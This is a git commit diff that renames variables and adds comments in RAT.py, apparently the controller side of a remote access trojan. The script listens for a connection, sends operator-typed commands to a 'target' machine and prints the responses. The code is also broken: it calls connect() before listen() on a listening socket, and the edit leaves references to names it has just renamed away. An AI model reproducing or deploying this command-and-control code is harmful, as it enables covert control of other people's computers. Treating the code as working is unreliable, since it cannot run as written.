322ae057705208a7e705117b24d2c7ebcbe562bd
saffronic <ashna0733@gmail.com>
2025-03-30 15:56:29 +0530

    adding comments

--- RAT.py
+++ RAT.py
@@ -1,19 +1,19 @@
 import socket
 
-host = '0.0.0.0'
+host = '0.0.0.0' #listening on all channels
 port = 9999
-serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-serv.connect((host, port))
-serv.listen(1)
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.connect((host, port))
+server.listen(1)
 print(f"Server listening on {host} : {port}") 
-cli_socket, cli_address = serv.accept()
+target_socket, target_address = serv.accept()
 print(f"connection from {cli_address}")
 while True:
     command = input("Enter command: ")
     if command.lower() == 'exit' :
         break
-    cli_socket.send(command.encode())
-    response = cli_socket.recv(1024).decode()
+    target_socket.send(command.encode())
+    response = target_socket.recv(1024).decode()
     print(f"Client response: {response}")
-    cli_socket.close()
-serv.close()
+    target_socket.close()
+server.close()
